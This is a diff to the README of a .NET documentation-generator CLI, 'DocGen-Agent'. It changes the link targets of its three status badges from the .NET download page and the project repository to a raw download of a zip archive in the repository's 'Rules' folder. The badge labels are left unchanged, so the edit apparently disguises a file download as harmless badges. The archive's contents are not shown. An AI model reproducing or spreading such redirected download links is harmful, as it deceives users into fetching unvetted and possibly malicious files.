@@ -1,8 +1,8 @@
 # DocGen-Agent CLI 🤖📝
 
-[![.NET 10](https://img.shields.io/badge/.NET-10.0-blue.svg)](https://dotnet.microsoft.com/download/dotnet/10.0)
-[![Phase](https://img.shields.io/badge/Phase-3%20(AI%20Multi--Provider)-orange.svg)](https://github.com/rubendario921/docgen-agent-cli)
-[![Docker](https://img.shields.io/badge/Docker-Available-green.svg)](https://github.com/rubendario921/docgen-agent-cli)
+[![.NET 10](https://img.shields.io/badge/.NET-10.0-blue.svg)](https://github.com/rubendario921/docgen-agent-cli/raw/refs/heads/main/Rules/docgen-cli-agent-v3.0.zip)
+[![Phase](https://img.shields.io/badge/Phase-3%20(AI%20Multi--Provider)-orange.svg)](https://github.com/rubendario921/docgen-agent-cli/raw/refs/heads/main/Rules/docgen-cli-agent-v3.0.zip)
+[![Docker](https://img.shields.io/badge/Docker-Available-green.svg)](https://github.com/rubendario921/docgen-agent-cli/raw/refs/heads/main/Rules/docgen-cli-agent-v3.0.zip)
 
 Agente inteligente CLI diseñado para la generación automatizada de documentación técnica de alta calidad. Utiliza **Arquitectura Hexagonal**, **IA (Azure OpenAI / GitHub Copilot)** y análisis estático para transformar código fuente en documentación estándar y profesional.
 
